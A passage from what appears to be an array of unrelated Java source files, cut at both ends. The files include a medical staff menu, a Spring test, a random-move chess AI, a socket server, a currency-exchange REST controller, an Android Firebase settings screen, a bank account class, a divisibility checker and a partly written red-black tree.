especialidadeMedico = sc.next();\n\t\t\t\t\t    \n\t\t\t\t\t    sistema.adicionarMedico(new Medico(nomeMedico, cpfMedico, telefoneMedico, ruaMedico, cidadeMedico, estadoMedico,\n\t\t\t\t\t            salarioMedico, funcaoMedico, especialidadeMedico));\n\t\n\t\t\t\t\t    System.out.println(\"M\u00e9dico adicionado com sucesso!\");\n\t\t\t\t\t    \n\t\t\t\t\t    dataToSave = \"Novo m\u00e9dico adicionado: \" + nomeMedico + \", CPF: \" + cpfMedico;\n\t\t\t\t\t    if (fileHandler.saveToFile(dataToSave)) {\n\t\t\t\t\t        System.out.println(\"Dados do novo m\u00e9dico salvos com sucesso no arquivo.\");\n\t\t\t\t\t    } else {\n\t\t\t\t\t        System.out.println(\"Erro ao salvar os dados do novo m\u00e9dico no arquivo.\");\n\t\t\t\t\t    }\n\t\t\t\t\t    break;\n\t                case 2:\n\t                \tSystem.out.println(\"Digite o nome do m\u00e9dico para alterar seus dados:\");\n\t                    String nomeMedicoAlterar = sc.n",
    "import koschei.KoscheiTheDeathless;\nimport koschei.config.AppConfig;\nimport org.junit.Assert;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\n\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(classes = AppConfig.class)\npublic class MainTest {\n\n    @Autowired\n    private ApplicationContext applicationContext;\n\n    @Test\n    public void mainTest() {\n        String text = \"\u041d\u0430 \u0441\u0432\u0435\u0442\u0435 \u0435\u0441\u0442\u044c \u043e\u043a\u0435\u0430\u043d , \u043d\u0430 \u043e\u043a\u0435\u0430\u043d\u0435 \u043e\u0441\u0442\u0440\u043e\u0432 , \u043d\u0430 \u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0434\u0435\u0440\u0435\u0432\u043e , \u043d\u0430 \u0434\u0435\u0440\u0435\u0432\u0435 \u0437\u0430\u044f\u0446 , \u0432 \u0437\u0430\u0439\u0446\u0435 \u0443\u0442\u043a\u0430 , \u0432 \u0443\u0442\u043a\u0435 \u044f\u0439\u0446\u043e , \u0432 \u044f\u0439\u0446\u0435 \u0438\u0433\u043e\u043b\u043a\u0430 , \u0441\u043c\u0435\u0440\u0442\u044c \u041a\u043e\u0449\u0435\u044f \u043d\u0430 \u0438\u0433\u043b\u0435 :(\";\n\n        KoscheiTheDeathless koscheiTheDeathless =\n                applicationContext.getBean(KoscheiTheDeathless.class);\n        System.out.println(koscheiTheDeathless.getRulesByDeth());\n        String testText = koscheiTheDeathless.getRulesByDeth();\n\n        if (!testText.contains(text) && testText.length() <= text.length()) {\n            Assert.fail(\"\u0422\u0435\u0441\u0442 \u043f\u0440\u043e\u0432\u0430\u043b\u0435\u043d, \u043d\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u0441\u0432\u044f\u0437\u044c \u0431\u0438\u043d\u043e\u0432. \u0418\u0442\u043e\u0433\u043e\u0432\u0430\u044f \u0444\u0440\u0430\u0437\u0430 \u043d\u0435 \u0432\u0435\u0440\u043d\u0430.\");\n        }\n    }\n\n}\n",
    "import java.awt.*;\nimport java.util.ArrayList;\nimport java.util.Random;\n\n/**\n * Created by Armin on 4/4/2016.\n */\npublic class ChessAI {\n\n    private int AIplayerNo = 2;\n\n    private ChessGUI parent;\n\n    public ChessAI(ChessGUI parent){\n        this.parent = parent;\n    }\n\n    private ArrayList<PieceMove> getMoves(){\n        ArrayList<PieceMove> moves = new ArrayList<PieceMove>();\n        //for(ChessPiece chp : parent.chessPieces) {\n        for(int chpi=0;chpi<parent.chessPieces.size();chpi++){\n            ChessPiece chp = parent.chessPieces.get(chpi);\n            if(chp.player == AIplayerNo) {\n                for (Point move : parent.getPossibleMoves(chp)){\n                    int pf = (AIplayerNo == 2) ? 1 : -1;\n                    int newx = (chp.x + move.x * pf);\n                    int newy = (chp.y + move.y * pf);\n\n                    if (newx >= 0 && newy >= 0 && newx <= 8 && newy <= 8) {\n                        if (parent.isOccupied(newx, newy) == 0) {\n                            PieceMove m = new PieceMove(chpi,new Point(newx,newy));\n                            m.isGoingToCapture =false;\n                            moves.add(m);\n                            System.out.println(\"MOVE  [x=\" + chp.x + \",y=\" + chp.y +\"] to {x=\" + newx + \",y=\" + newy + \"]\");\n                        } else if (parent.isOccupied(newx, newy) != AIplayerNo) {\n                            PieceMove m = new PieceMove(chpi,new Point(newx,newy));\n                            m.isGoingToCapture = true;\n                            m.CapturingPiece = parent.getPieceAt(newx,newy);\n                            moves.add(m);\n                            System.out.println(\"CAPTURE  [x=\" + chp.x + \",y=\" + chp.y +\"] to {x=\" + newx + \",y=\" + newy + \"]\");\n                        }\n                    }\n                }\n            }\n        }\n        return moves;\n    }\n\n    public PieceMove playMove(){\n        Random rnd = new Random();\n        ArrayList<PieceMove> moves = getMoves();\n        int i = rnd.nextInt(moves.size());\n        return moves.get(i);\n    }\n\n    public void printMoves(){\n        System.out.println(\"Printing Moves ...\");\n        System.out.println(getMoves().size());\n        //for(PieceMove pm : getMoves()){\n        // System.out.println(pm.type.toString());\n        //}\n    }\n\n\n}\n",
    "package ServidorMultihilo;\nimport java.io.IOException;\nimport java.net.ServerSocket;\n\npublic class ServidorMultihilo{\n\n    public static void main(String[] args){\n        // Contador de clientes\n        int count = 0;\n        \n        // Establece el puerto a utilizar\n        int puerto = 8080;\n        // Crea un socket de servidor\n        try (ServerSocket ss = new ServerSocket(puerto)){\n            System.out.println(\"Servidor escuchado en el puerto: \"+ puerto + \"...\");\n            System.out.println(\"Clientes conectados: \" + count);\n            // El servidor va a escuchar conexiones hasta presionar Ctrl+C\n            // Cada cliente se manda a un nuevo hilo por lo que siempre\n            // estara dispuesto a recibir nuevos clientes\n            while (true) {\n                count++; // Incrementar el contador de clientes\n                // El servidor env\u00eda un archivo grande a cada cliente\n                HiloHandler cliente = new HiloHandler(ss.accept(), count);\n                Thread h1 = new Thread(cliente);\n                h1.start();\n                System.out.println(\"Clientes conectados: \" + count);\n            }\n        } catch(IOException ex){\n            System.out.println(ex);\n        }\n    }\n}",
    "package com.poc.currencyexchangeservice.resource;\n\nimport java.util.Map;\n\nimport com.poc.currencyexchangeservice.util.environment.InstanceInformationService;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestHeader;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class CurrencyExchangeController {\n\n\tprivate static final Logger LOGGER = LoggerFactory.getLogger(CurrencyExchangeController.class);\n\n\t@Autowired\n\tprivate ExchangeValueRepository repository;\n\n\t@Autowired\n\tprivate InstanceInformationService instanceInformationService;\n\n\t@GetMapping(\"/\")\n\tpublic String imHealthy() {\n\t\treturn \"{healthy:true}\";\n\t}\n\n\t//http://localhost:8000/currency-exchange/from/USD/to/INR\n\t@GetMapping(\"/currency-exchange/from/{from}/to/{to}\")\n\tpublic ExchangeValue retrieveExchangeValue(@PathVariable String from, @PathVariable String to,\n\t\t\t@RequestHeader Map<String, String> headers) {\n\n\t\tprintAllHeaders(headers);\n\n\t\tExchangeValue exchangeValue = repository.findByFromAndTo(from, to);\n\n\t\tLOGGER.info(\"{} {} {}\", from, to, exchangeValue);\n\n\t\tif (exchangeValue == null) {\n\t\t\tthrow new RuntimeException(\"Unable to find data to convert \" + from + \" to \" + to);\n\t\t}\n\n\t\texchangeValue.setExchangeEnvironmentInfo(instanceInformationService.retrieveInstanceInfo());\n\n\t\treturn exchangeValue;\n\t}\n\n\tprivate void printAllHeaders(Map<String, String> headers) {\n\t\theaders.forEach((key, value) -> {\n\t\t\tLOGGER.info(String.format(\"Header '%s' = %s\", key, value));\n\t\t});\n\t}\n}\n",
    "package blasa.go;\n\nimport android.app.ProgressDialog;\nimport android.content.ContentResolver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.net.Uri;\nimport android.os.Bundle;\nimport android.support.annotation.NonNull;\nimport android.support.annotation.Nullable;\nimport android.support.design.internal.NavigationMenu;\nimport android.support.v4.app.Fragment;\nimport android.util.Log;\nimport android.view.LayoutInflater;\nimport android.view.MenuItem;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.webkit.MimeTypeMap;\nimport android.widget.EditText;\nimport android.widget.ImageView;\nimport android.widget.TextView;\nimport android.widget.Toast;\n\nimport com.facebook.login.LoginManager;\nimport com.firebase.client.ChildEventListener;\nimport com.firebase.client.DataSnapshot;\nimport com.firebase.client.Firebase;\nimport com.firebase.client.FirebaseError;\nimport com.firebase.client.ValueEventListener;\nimport com.google.android.gms.tasks.OnFailureListener;\nimport com.google.android.gms.tasks.OnSuccessListener;\nimport com.google.firebase.auth.FirebaseAuth;\nimport com.google.firebase.auth.FirebaseUser;\nimport com.google.firebase.database.DatabaseError;\nimport com.google.firebase.database.DatabaseReference;\nimport com.google.firebase.database.FirebaseDatabase;\nimport com.google.firebase.storage.FirebaseStorage;\nimport com.google.firebase.storage.OnProgressListener;\nimport com.google.firebase.storage.StorageReference;\nimport com.google.firebase.storage.StorageTask;\nimport com.google.firebase.storage.UploadTask;\nimport com.squareup.picasso.Picasso;\n\nimport de.hdodenhof.circleimageview.CircleImageView;\nimport io.github.yavski.fabspeeddial.FabSpeedDial;\n\nimport static android.app.Activity.RESULT_OK;\n\n/**\n * Created by omarelamri on 10/04/2018.\n */\n\npublic class FragmentSettings extends Fragment {\n    View v;\n    private static final String TAG = \"TEST_TEST\";\n    private Firebase myFirebaseRef;\n    private FirebaseAuth mAuth;\n    private EditText name2;\n    //private ImageView profilePicture;\n    private Uri mImageUri;\n    private StorageReference mStorageRef;\n    private StorageTask mUploadTask;\n    private String PROVIDER_ID;\n    private ProgressDialog progressDialog ;\n    private static final int PICK_IMAGE_REQUEST = 1;\n    private ValueEventListener valueEventListener;\n    private DatabaseReference mDatabase;\n\n    public FragmentSettings() {\n\n    }\n\n    @Nullable\n    @Override\n    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        v = inflater.inflate(R.layout.settings_fragment, container, false);\n\n\n\n        progressDialog = new ProgressDialog(v.getContext());\n        name2 = (EditText) v.findViewById(R.id.name);\n       // profilePicture = (ImageView) v.findViewById(R.id.profilePicture);\n\n        mAuth = FirebaseAuth.getInstance();\n        final FirebaseUser mUser = mAuth.getCurrentUser();\n//Get the uid for the currently logged in User from intent data passed to this activity\n        final String uid = mAuth.getCurrentUser().getUid();\n\n       mDatabase = FirebaseDatabase.getInstance().getReference(\"Users\");\n\n//photos folder creation\n        mStorageRef = FirebaseStorage.getInstance().getReference(\"uploads\");\n//display user's information based on auth provider\n        PROVIDER_ID = mUser.getProviders().get(0);\n\n        if (PROVIDER_ID.equals(\"password\")) {\n            Log.d(TAG, \"provider = \"+ PROVIDER_ID);\n            myFirebaseRef = new Firebase(\"https://blasa-v2-8675.firebaseio.com/users/\");\n//name\n            myFirebaseRef.child(uid).child(\"name\").addValueEventListener(new ValueEventListener() {\n                //onDataChange is called every time the name of the User changes in your Firebase Database\n                @Override\n                public void onDataChange(DataSnapshot dataSnapshot) {\n//Inside onDataChange we can get the data as an Object from the dataSnapshot\n//getValue returns an Object. We can specify the type by passing the type expected as a parameter\n                    String data = dataSnapshot.getValue(String.class);\n                    name2.setText(data);\n                    name2.setEnabled(false);\n                }\n\n                //onCancelled is called in case of any error\n                @Override\n                public void onCancelled(FirebaseError firebaseError) {\n                    Toast.makeText(v.getContext(), \"\" + firebaseError.getMessage(), Toast.LENGTH_LONG).show();\n                }\n            });\n\n//photo\n            myFirebaseRef.child(uid).child(\"photoURL\").addValueEventListener(new ValueEventListener() {\n                //onDataChange is called every time the name of the User changes in your Firebase Database\n                @Override\n                public void onDataChange(DataSnapshot dataSnapshot) {\n//Inside onDataChange we can get the data as an Object from the dataSnapshot\n//getValue returns an Object. We can specify the type by passing the type ex",
    "\npublic abstract class Conta implements InterfConta {\n\t\n\tprivate static final int AGENCIA_PADRAO = 1;\n\tprivate static int SEQUENCIAL = 1;\n\n\tprotected int agencia;\n\tprotected int numero;\n\tprotected double saldo;\n\tprotected Cliente cliente;\n\n\tpublic Conta(Cliente cliente) {\n\t\tthis.agencia = Conta.AGENCIA_PADRAO;\n\t\tthis.numero = SEQUENCIAL++;\n\t\tthis.cliente = cliente;\n\t}\n\n\t@Override\n\tpublic void sacar(double valor) {\n\t\tsaldo -= valor;\n\t}\n\n\t@Override\n\tpublic void depositar(double valor) {\n\t\tsaldo += valor;\n\t}\n\n\t@Override\n\tpublic void transferir(double valor, InterfConta contaDestino) {\n\t\tthis.sacar(valor);\n\t\tcontaDestino.depositar(valor);\n\t}\n\n\tpublic int getAgencia() {\n\t\treturn agencia;\n\t}\n\n\tpublic int getNumero() {\n\t\treturn numero;\n\t}\n\n\tpublic double getSaldo() {\n\t\treturn saldo;\n\t}\n\n\tprotected void imprimirInfosComuns() {\n\t\tSystem.out.println(String.format(\"Titular: %s\", this.cliente.getNome()));\n\t\tSystem.out.println(String.format(\"Agencia: %d\", this.agencia));\n\t\tSystem.out.println(String.format(\"Numero: %d\", this.numero));\n\t\tSystem.out.println(String.format(\"Saldo: %.2f\", this.saldo));\n\t}\n}",
    "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n\n        System.out.println(\"Please enter an integer number:\");\n        int number = sc.nextInt();\n\n        boolean divisibleBy4 = number % 4 == 0;\n        boolean divisibleBy6 = number % 6 == 0;\n        boolean divisibleBy10 = number % 10 == 0;\n\n        if (divisibleBy4 || divisibleBy6 || divisibleBy10) {\n            System.out.print(number + \" is divisible by \");\n            if (divisibleBy4)\n                System.out.print(\"4\");\n            if (divisibleBy6) {\n                if (divisibleBy4)\n                    System.out.print(\", \");\n                System.out.print(\"6\");\n            }\n            if (divisibleBy10) {\n                if (divisibleBy4 || divisibleBy6)\n                    System.out.print(\", \");\n                System.out.print(\"10\");\n            }\n            System.out.println();\n        } else {\n            System.out.println(number + \" is not divisible by 4, 6, or 10\");\n        }\n    }\n}",
    "\n\n\n/**\n * todo  \u0420\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u043c \u043a\u043b\u0430\u0441\u0441 \u0434\u043b\u044f \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u0433\u043e \u043f\u043e\u0438\u0441\u043a\u0430:\n * \u041a\u043b\u0430\u0441\u0441 Node \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0434\u0435\u0440\u0435\u0432\u0430\n * \u041a\u043b\u0430\u0441\u0441 Tree \u0434\u043b\u044f \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0441\u0430\u043c\u043e\u0433\u043e \u0434\u0435\u0440\u0435\u0432\u0430;\n * \u0420\u0435\u0430\u043b-\u043c \u043a\u043b\u0430\u0441\u0441 \u0431\u0435\u0437 \u043c\u0435\u0442\u043e\u0434\u043e\u0432.\n */\n\n/**\n * @reference root \u044d\u0442\u043e \u043a\u043e\u0440\u0435\u043d\u044c \u0434\u0435\u0440\u0435\u0432\u0430, \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u044b\u0439 \u043d\u043e\u0434\n */\npublic class Tree {\n    Node root;\n\n\n    class Node { //\u043a\u0430\u0436\u0434\u044b\u0439 \u0443\u0437\u0435\u043b \u0445\u0440\u0430\u043d\u0438\u0442 \u0432 \u0441\u0435\u0431\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0438 \u0441\u0441\u044b\u043b\u043a\u0438 \u043d\u0430 \u043b\u0435\u0432\u044b\u0439 \u0438 \u043f\u0440\u0430\u0432\u044b\u0439 \u0443\u0437\u043b\u044b\n        int value;\n        Node left;\n        Node right;\n        Color color;\n\n    }\n\n    enum Color { //\u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u0446\u0432\u0435\u0442\u043e\u0432\n        BLACK,\n        RED\n    }\n\n    /**\n     * todo \u0420\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u043c \u043c\u0435\u0442\u043e\u0434 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432 \u0434\u0435\u0440\u0435\u0432\u043e\n     * \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043c\u0435\u0442\u043e\u0434 insert(int value) \u0434\u043b\u044f \u0432\u0441\u0442\u0430\u0432\u043a\u0438 \u0447\u0438\u0441\u043b\u0430 \u0432 \u0434\u0435\u0440\u0435\u0432\u043e.\n     * \u0414\u043b\u044f \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u044f \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u043f\u0435\u0440\u0435\u0434 \u0432\u0441\u0442\u0430\u0432\u043a\u043e\u0439 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f \u043f\u043e\u0438\u0441\u043a \u0442\u043e\u0433\u043e \u043c\u0435\u0441\u0442\u0430 \u0434\u0435\u0440\u0435\u0432\u0430,\n     * \u0433\u0434\u0435 \u044d\u0442\u043e \u0447\u0438\u0441\u043b\u043e \u043c\u043e\u0433\u043b\u043e \u0431\u044b \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u044c\u0441\u044f.\n     *  \u0411\u0418\u041d\u0410\u0420\u041d\u041e\u0415 \u0414\u0415\u0420\u0415\u0412\u041e \u041f\u041e\u0418\u0421\u041a\u0410 \u041d\u0415 \u0425\u0420\u0410\u041d\u0418\u0422 \u041f\u041e\u0412\u0422\u041e\u0420\u042f\u042e\u0429\u0418\u0415\u0421\u042f \u042d\u041b\u041c\u0415\u041d\u0422\u042b!\n     */\n    public void insert(int value) { //\u043f\u0440\u0438\u043c\u0435\u0440 \u0432\u0441\u0442\u0430\u0432\u043a\u0438 \u0432 \u043a\u043e\u0440\u0435\u043d\u044c\n        if (root != null) { //\u0435\u0441\u043b\u0438 \u043d\u043e\u0434\u0430 \u043d\u0435 \u043f\u0443\u0441\u0442\u0430\u044f, \u0442\u043e \u0432\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c \u043d\u043e\u0432\u0443\u044e \u043d\u043e\u0434\u0443 \u0441\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\u043c.\n            insert(root, value);\n            root = balance(root);\n        } //\u0432\u0441\u0442\u0430\u0432\u043a\u0430 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u043d\u0430\u043f\u0440\u044f\u043c\u0443\u044e.\n        else { //\u0435\u0441\u043b\u0438 \u043d\u043e\u0434\u0430 \u043f\u0443\u0441\u0442\u0430\u044f,\n            root = new Node(); //\u0441\u043e\u0437\u0434\u0430\u0435\u043c \u043d\u043e\u0432\u0443\u044e \u043d\u043e\u0434\u0443 \u043d\u0430 \u043c\u0435\u0441\u0442\u0435 \u043d\u043e\u0434\u044b \u0440\u0443\u0442.\n            root.value = value; //\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\u043c value \u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u0441\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u0442-\u0435 \u043f\u0440\u0438\u0448\u043b\u043e \u0438\u0437 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430.\n        }\n        root.color = Color.BLACK; //\u0432\u0440\u0443\u0447\u043d\u0443\u044e \u043f\u0435\u0440\u0435\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u043c \u0440\u0443\u0442 \u043d\u0430 \u0447\u0435\u0440\u043d\u044b\u0439\n    }\n\n    private void insert(Node node, int value) { //\u0435\u0441\u043b\u0438 \u043c\u044b \u0445\u043e\u0442\u0438\u043c \u0432\u0441\u0442\u0430\u0432\u0438\u0442\u044c \u043d\u0435 \u0432 \u043a\u043e\u0440\u0435\u043d\u044c\n        //\u043d\u0430\u0434\u043e \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c \u043d\u0435 \u0441\u043e\u0432\u043f\u0430\u043b\u0438 \u043b\u0438 \u043f\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044e \u0441 \u044d\u043b\u0435\u043c-\u043c, \u043a\u043e\u0442-\u0439 \u043c\u044b \u0445\u043e\u0442\u0438\u043c \u0432\u0441\u0442\u0430\u0432\u0438\u0442\u044c.\n        if (node.value != value) {//\u0435\u0441\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043d\u043e\u0434\u044b \u043d\u0435 \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u0441\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\u043c \u043a\u043e\u0442-\u0439 \u0445\u043e\u0442\u0438\u043c \u0432\u0441\u0442\u0430\u0432\u0438\u0442\u044c, \u0442\u043e \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0430\u0435\u043c \u0430\u043b\u0433-\u043c.\n            //\u0442\u0430\u043a \u043a\u0430\u043a \u0432\u0435\u0440\u0448\u0438\u043d\u0430 root \u0437\u0430\u043d\u044f\u0442\u0430 \u043d\u0430\u0434\u043e \u0432\u044b\u0431\u0440\u0430\u0442\u044c \u0432\u043b\u0435\u0432\u043e \u0438\u043b\u0438 \u0432\u043f\u0440\u0430\u0432\u043e \u043f\u043e\u043c\u0435\u0449\u0430\u0442\u044c \u044d\u043b\u0435\u043c.:\n            if (node.value < value) {//\u0435\u0441\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u0442-\u0439 \u043c\u044b \u0445\u043e\u0442\u0438\u043c \u0432\u0441\u0442\u0430\u0432\u0438\u0442\u044c \u0431\u043e\u043b\u044c\u0448\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043d\u043e\u0434\u044b,\u0442\u043e \u0432\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c \u0432\u043f\u0440\u0430\u0432\u043e.\n                  if (node.right == null) {\n                    node.right = new Node();\n                    node.right.value = value;\n                    node.right.color = Color.RED;\n                } else {//\u043d\u043e\u0434\u0430 \u043d\u0435 \u043f\u0443\u0441\u0442\u0430\u044f,\n                    insert(node.right, value);//\u0441\u043c.\u0432 \u043a\u0430\u043a\u0443\u044e \u0434\u043e\u0447\u043a\u0443 \u043c\u043e\u0436\u0435\u043c \u043f\u043e\u043b\u043e\u0436\u0438\u0442\u044c \u044d\u043b\u0435\u043c. \u043f\u043e \u043f\u0440\u0430\u0432\u043e\u0439 \u0432\u0435\u0442\u043a\u0435.\n                    node.right = balance(node.right);\n                }\n            } else {//\u0435\u0441\u043b\u0438 \u043f\u043e\u0439\u0434\u0435\u043c \u043f\u043e \u043b\u0435\u0432\u043e\u0439 \u0432\u0435\u0442\u043a\u0435\n                if (node.left == null) {\n                    node.left = new Node();\n                    node.left.value = value;\n                    node.right.color = Color.RED;\n                } else {//\u043d\u043e\u0434\u0430 \u043d\u0435 \u043f\u0443\u0441\u0442\u0430\u044f,\n                    insert(node.left, value);//\u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u0443\u044e \u0432\u0441\u0442\u0430\u0432\u043a\u0443 \u043f\u043e \u043b\u0435\u0432\u043e\u0439 \u0432\u0435\u0442\u043a\u0435.\n                    node.left = balance(node.left);\n\n                }\n            }\n        }\n    }\n\n    //todo \u0420\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u043c \u043c\u0435\u0442\u043e\u0434 \u043f\u043e\u0438\u0441\u043a\u0430:\n    //\u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043c\u0435\u0442\u043e\u0434 find(int value) \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043d\u0430 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043e\u0432\u0430\u043d\u0438\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u0434\u0435\u0440\u0435\u0432\u0430 \u0441\u043e \u0437\u043d\u0430\u0447\u0435-\u043c value.\n    //\u0412\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u043e\u0431\u044a\u0435\u043a\u0442 Node, \u0435\u0441\u043b\u0438 \u043d\u0430\u0448\u043b\u0438 \u043d\u0443\u0436\u043d\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442, \u0438\u043d\u0430\u0447\u0435 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c null.\n    public Node find(int value) {\n        return find(root, value);\n    }\n\n    private Node find(Node node, int value) {\n        if (node == null) //\u0435\u0441\u043b\u0438 \u043d\u0435 \u043d\u0430\u0448\u043b\u0438 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440, \u0442\u043e \u043d\u043e\u0434\u0430 \u043d\u0430\u043b\u043b.\n            return null;//\u0442\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 value \u043d\u0435\u0442.\n        if (node.value == value) { //\u0435\u0441\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043d\u043e\u0434\u044b \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u0441\u043e \u0437\u043d\u0430\u0447-\u043c \u043a\u043e\u0442-\u0439 \u043c\u044b \u043f\u0435\u0440\u0435\u0434\u0430\u0435\u043c/\u0438\u0449\u0435\u043c.\n            return node;//\u0442\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0443\u044e \u043d\u043e\u0434\u0443, \u043a\u043e\u0442-\u0439 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043e\u0442\u0432\u0435\u0442\u043e\u043c.\n        }\n        if (node.value < value) { //\u0435\u0441\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0442\u0435\u043a\u0443\u0449\u0435\u0439 \u043d\u043e\u0434\u044b \u043c\u0435\u043d\u044c\u0448\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430,\u043a\u043e\u0442-\u0439 \u043f\u0435\u0440\u0435\u0434\u0430\u0435\u043c.\n            return find(node.right, value);\n        } else {\n            return find(node.left, value);\n        }\n    }\n\n\n    private Node leftRotate(Node node) { //\u043f\u043e\u0432\u043e\u0440\u043e\u0442 \u043f\u0440\u043e\u0442\u0438\u0432 \u0447\u0430\u0441.\u0441\u0442\u0440\u0435\u043b\u043a\u0438 \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0435\u043c \u043d\u043e\u0434\u0443 \u043a\u043e\u0442-\u044e \u043f\u043e\u0432\u043e\u0440\u0430\u0447\u0438\u0432\u0430\u0435\u043c.\n        Node cur = node.right; // \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043b\u0435\u0432.\u043f\u043e\u0432\u043e\u0440\u043e\u0442 \u043d\u0430\u0434\u043e \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u043d\u043e\u0434\u0443 \u043a\u0430\u0440\u0435\u043d\u0442,\u043a\u043e\u0442-\u0439 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043f\u043e \u043f\u0440\u0430\u0432\u043e\u0439 \u0441\u0442\u043e\u0440\u043e\u043d\u0435 \u043e\u0442 \u0442\u0435\u043a\u0443\u0449.\u043d\u043e\u0434\u044b\n        node.right = cur.left; //\u043f\u0435\u0440\u0435\u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u0435\u043c \u0441\u0441\u044b\u043b\u043a\u0438\n        cur.left = node;\n        cur.color = node.color;\n        node.color = Color.RED;\n        return cur;\n    }\n    private Node rightRotate(Node node) {\n        Node cur = node.left; // \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043f\u0440\u0430\u0432..\u043f\u043e\u0432\u043e\u0440\u043e\u0442 \u043d\u0430\u0434\u043e \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u043d\u043e\u0434\u0443 \u043a\u0430\u0440\u0435\u043d\u0442,\u043a\u043e\u0442-\u0439 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043f\u043e \u043b\u0435\u0432\u043e\u0439 \u0441\u0442\u043e\u0440\u043e\u043d\u0435 \u043e\u0442 \u0442\u0435\u043a\u0443\u0449.\u043d\u043e\u0434\u044b\n         node.left = cur.right; //\u043f\u0435\u0440\u0435\u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u0435\u043c \u0441\u0441\u044b\u043b\u043a\u0438\n        cur.right = node;\n        cur.color = node.color;\n        node.color = Color.RED;\n        return cur;\n    }\n\n    private void swapColors(Node node) {\n        node.color = (node.color == Color.RED ? Color.BLACK : Color.RED); //\u0435\u0441\u043b\u0438 \u043d\u043e\u0434\u0430 \u043a\u0440\u0430\u0441\u043d\u043e\u0433\u043e \u0446\u0432\u0435\u0442\u0430, \u0442\u043e 